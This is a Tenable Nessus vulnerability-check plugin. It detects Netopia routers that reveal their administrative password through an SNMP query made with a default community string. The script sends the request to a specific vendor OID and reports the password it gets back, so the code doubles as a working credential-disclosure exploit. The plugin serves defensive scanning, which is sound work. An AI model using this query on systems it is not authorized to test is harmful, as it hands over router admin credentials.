#TRUSTED 8fbc4ff300574a27d50c85ad47f3a26f864b07885b52ba36340b1cec1a6bbae3aa8bd4efcc640ad1621de3cc0504cacc1d3ec69676e16a930eb3340a0a2ffe468bed53e175926d0ae0036de4303676e1b57a825d95b7c5e903d53df98ca483cec90cb1f87c46c326eca8e52001da74626b31dfb45d0b26bf157a915d201c931be59adae655898f4cd0c7b5192f30f42edbb72fac276f90cb09f1914a0f4ecfb51cb82ddcc94e55e7e1c506ee2386a54cb6326948bcabd3264cc17f36c2a87ebeb61a4d09a8966c38ce1061a80bc844ca7f1c3b1ccef0b26771830dcee2a2f61f856b55e9de7fc8d90591140fc87b0531b4889a1238aacedec4cd8b39c9587a7d431d7d1dbe14d2744013e053acf22625edd65e5b2ead2c34cf813e8ed5150d3373b136aed72e2daa6eba724f819919d73f3168be277c8ac565b566dedf2acc32541b84c6158ce37046046047f7347801ca0ea246b4b2df0e4888db03899b343703719f83a923244a71d5ef5ac20b8e8bdb1e644db6eeb9dae171e7bc656353c20ece3950d565efe1305636d2badc3b5606a644e622d4c590c270ce49b600617fed48df4de526581f63114627bf38a3eb2cc870575b4f20d629ae3e7c3fde4676b624605da80e1b24b77ecd82586fe88600ce08318a32bd221809df0722680d3dbef448f31a74ac8fd81169dc111b77938eaaaf93a3a56347a1c8d466056d8b5e
#TRUST-RSA-SHA256 75ceb46b1bd2714768c36235be7b21d9f4a822ea2f874a8177c7c73615edca63dc68e58fc94397c022990718e1131916f4093bcc5381ece6b415021f7e88998ff78b35f34498a3b3f84caa71b565ec98b64a25cbb6cadb07a08355aa25b4d8a5d7b4f616ecdd16dadade01382434843231ac83e440e47e1cc11e50b723198453bd0706047771ce98ab1dec68276751cc1b2bcd7f40b82fd71b1f9fe6e0ec2e2f8a919404bcf016e17dae3bfd647365c67ad9029f44d7c697822197faf48bc89d47136ff59341882fb6e3406ef13bd69722047d0f0e64a7cd532271ece2994859ac7a242a054b6be714b7672d58d3208ca886514ca35677b9b9a1be840bf4f2fea00d218b0c5d5aeb38431e38074ff3fc021934b4773b037a587a5bf4b1e8c774000b8d3596fc15ed9f9d7de68b1df750d4c1a40d51536768ebecfbd684756e5c509b1f85d766d749c2a62d01b5a45da828082f9d4ebb2ef2e95c30be41d7e3ec06a1a76020c6ff39db0b8b623dfdf846f058a6e92433d4dba5a5bcdce64223f3c45ef00ed2e42b38f6ef6010bac7009e835f43df847e63a40578478bef178c379200bbcb19f34e737a81ac3fb478dc107029d9b1c1627924f31cd420b04bbec705c1879114fc57fd1a3e08e67a374266a3a092f1af72542109165129ff97fb4098a74aa01c2f435679435f116713dc77a52b00add7a1a9846e93cd8a751c22ba
#
# (C) Tenable Network Security, Inc.
#


include('compat.inc');

if (description)
{
 script_id(22415);
 script_version("1.16");
 script_set_attribute(attribute:"plugin_modification_date", value:"2023/11/08");

 script_name(english:"Netopia Router Crafted SNMP Request Remote Admin Password Disclosure");
 script_summary(english:"Checks to see if the router will disclose the admin password");
 script_set_attribute(attribute:"synopsis", value:
"The remote router allows anonymous users to retrieve the administrative password" );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running a Netopia router with SNMP enabled.
Further, the Netopia router is using the default SNMP community strings.
This version of the Netopia firmware is vulnerable to a flaw wherein
a remote attacker can, by sending a specially formed SNMP query, retrieve
the Administrative password.

An attacker, exploiting this flaw, would only need to be able to send SNMP
queries to the router using the default community string of 'public'.
Successful exploitation would result in the attacker gaining administrative
credentials to the router." );
 script_set_attribute(attribute:"see_also", value:"http://www.netopia.com/" );
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for a patch.  Change the default SNMP community string to
one that is not easily guessed." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_attribute(attribute:"cvss_score_source", value:"manual");
 script_set_attribute(attribute:"cvss_score_rationale", value:"Score based on an in-depth analysis by Tenable.");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/09/20");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"Misc.");
 script_copyright(english:"This script is Copyright (C) 2006-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");
 script_dependencies("snmp_settings.nasl", "find_service2.nasl");
 script_require_keys("SNMP/community");
 exit(0);
}

#

include ('snmp_func.inc');
include ('misc_func.inc');

community = get_kb_item("SNMP/community");
if(!community)exit(0);

port = get_kb_item("SNMP/port");
if(!port)port = 161;
if (! get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open.");

soc = open_sock_udp(port);
if (!soc)
  exit (0);

password = snmp_request (socket:soc, community:community, oid:"1.3.6.1.4.1.304.1.3.1.23.1.0");

if(strlen(password))
{
 report = "The administrator password is '" + password + "'.";

 security_hole(port:port, extra:report, protocol:"udp");
}
